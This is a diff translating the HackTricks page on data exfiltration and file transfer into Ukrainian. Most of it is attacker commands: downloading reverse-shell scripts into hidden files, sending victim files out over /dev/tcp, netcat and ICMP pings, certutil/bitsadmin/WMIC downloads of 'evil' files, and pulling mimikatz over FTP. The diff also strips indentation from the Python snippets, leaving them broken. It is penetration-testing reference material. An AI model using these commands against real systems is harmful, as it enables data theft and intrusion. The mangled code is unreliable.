@@ -1,20 +1,20 @@
-# Exfiltration
+# Ексфільтрація
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
 
 </details>
 
-**Try Hard Security Group**
+**Група Try Hard Security**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -22,39 +22,32 @@ Other ways to support HackTricks:
 
 ***
 
-## Commonly whitelisted domains to exfiltrate information
+## Часто дозволені домени для ексфільтрації інформації
 
-Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
+Перевірте [https://lots-project.com/](https://lots-project.com/), щоб знайти часто дозволені домени, які можна зловживати
 
-## Copy\&Paste Base64
+## Копіювання та вставлення Base64
 
 **Linux**
-
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-
 **Windows**
-
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
-
 ## HTTP
 
 **Linux**
-
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-
 **Windows**
-
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -69,28 +62,24 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-
-### Upload files
+### Завантаження файлів
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 * [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-* Python module [uploadserver](https://pypi.org/project/uploadserver/):
-
+* Модуль Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
 python3 -m uploadserver
-# With basic auth: 
+# With basic auth:
 # python3 -m uploadserver --basic-auth hello:world
 
 # Send a file
-curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
+curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-
-### **HTTPS Server**
-
+### **HTTPS Сервер**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -122,34 +111,28 @@ httpd.serve_forever()
 ### USING FLASK
 from flask import Flask, redirect, request
 from urllib.parse import quote
-app = Flask(__name__)    
-@app.route('/')    
-def root():    
-    print(request.get_json())
-    return "OK"
-if __name__ == "__main__":    
-    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
+app = Flask(__name__)
+@app.route('/')
+def root():
+print(request.get_json())
+return "OK"
+if __name__ == "__main__":
+app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-
 ## FTP
 
-### FTP server (python)
-
+### FTP сервер (Python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-
-### FTP server (NodeJS)
-
+### FTP сервер (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-
-### FTP server (pure-ftp)
-
+### FTP сервер (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -167,9 +150,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-
-### **Windows** client
-
+### **Клієнт Windows**
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -180,37 +161,53 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-
 ## SMB
 
-Kali as server
-
+Kali як сервер
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-
-Or create a smb share **using samba**:
-
+Або створіть smb-ресурс **за допомогою samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
 chmod 777 /tmp/smb
 #Add to the end of /etc/samba/smb.conf this:
 [public]
-    comment = Samba on Ubuntu
-    path = /tmp/smb
-    read only = no
-    browsable = yes
-    guest ok = Yes
+comment = Samba on Ubuntu
+path = /tmp/smb
+read only = no
+browsable = yes
+guest ok = Yes
 #Start samba
 service smbd restart
 ```
-
 Windows
 
+### Exfiltration
+
+#### Bitsadmin
+```plaintext
+bitsadmin /transfer myjob /download /priority normal http://www.example.com/evilfile.txt C:\path\to\save\evilfile.txt
+```
+
+#### Certutil
+```plaintext
+certutil -urlcache -split -f http://www.example.com/evilfile.txt evilfile.txt
+```
+
+#### PowerShell
+```plaintext
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://www.example.com/evilfile.txt', 'C:\path\to\save\evilfile.txt')"
+```
+
+#### WMIC
+```plaintext
+wmic process call create "cmd.exe /c bitsadmin /transfer myjob /download /priority normal http://www.example.com/evilfile.txt C:\path\to\save\evilfile.txt"
+```
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -218,54 +215,44 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
-
 ## SCP
 
-The attacker has to have SSHd running.
-
+Атакуючому потрібно мати запущений SSHd.
 ```bash
-scp <username>@<Attacker_IP>:<directory>/<filename> 
+scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
-
 ## SSHFS
 
-If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
-
+Якщо жертва має SSH, зловмисник може змонтувати каталог з жертви на себе.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-
 ## NC
 
+Netcat (nc) - універсальна утиліта для зчитування та запису даних через мережу.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
-
 ## /dev/tcp
 
-### Download file from victim
-
+### Завантаження файлу з жертви
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-
-### Upload file to victim
-
+### Завантаження файлу на жертву
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-
-thanks to **@BinaryShadow\_**
+Спасибі **@BinaryShadow\_**
 
 ## **ICMP**
-
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -276,64 +263,54 @@ xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attack
 from scapy.all import *
 #This is ippsec receiver created in the HTB machine Mischief
 def process_packet(pkt):
-    if pkt.haslayer(ICMP):
-        if pkt[ICMP].type == 0:
-            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
-            print(f"{data.decode('utf-8')}", flush=True, end="")
+if pkt.haslayer(ICMP):
+if pkt[ICMP].type == 0:
+data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
+print(f"{data.decode('utf-8')}", flush=True, end="")
 
 sniff(iface="tun0", prn=process_packet)
 ```
-
 ## **SMTP**
 
-If you can send data to an SMTP server, you can create an SMTP to receive the data with python:
-
+Якщо ви можете надсилати дані на SMTP-сервер, ви можете створити SMTP для отримання даних за допомогою Python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
-
 ## TFTP
 
-By default in XP and 2003 (in others it needs to be explicitly added during installation)
+За замовчуванням у XP та 2003 (в інших потрібно явно додати під час встановлення)
 
-In Kali, **start TFTP server**:
-
+У Kali, **запустіть TFTP сервер**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-
-**TFTP server in python:**
-
+**TFTP сервер на python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-
-In **victim**, connect to the Kali server:
-
+У **жертви** підключіться до сервера Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
-
 ## PHP
 
-Download a file with a PHP oneliner:
-
+Завантажте файл за допомогою PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
-
 ## VBScript
 
+### VBScript
+
+VBScript (Visual Basic Scripting Edition) - це мова сценаріїв, яка використовується для розробки веб-сценаріїв та автоматизації завдань у середовищі Windows. VBScript може бути використаний для створення шкідливих сценаріїв, які виконуються на комп'ютері потенційною жертвою.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-
-**Victim**
-
+**Жертва**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -365,26 +342,19 @@ echo ts.Close >> wget.vbs
 ```bash
 cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
-
 ## Debug.exe
 
-The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.
-
+Програма `debug.exe` не тільки дозволяє переглядати бінарні файли, але також має **можливість перебудовувати їх з шістнадцяткового коду**. Це означає, що, надаючи шістнадцятковий код бінарного файлу, `debug.exe` може згенерувати файл. Проте важливо зауважити, що у debug.exe є **обмеження на збирання файлів розміром до 64 кб**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-
-Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
-
-* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
-
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Try Hard Security Group**
+**Група з безпеки Try Hard Security**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -392,14 +362,14 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**
 
 </details>
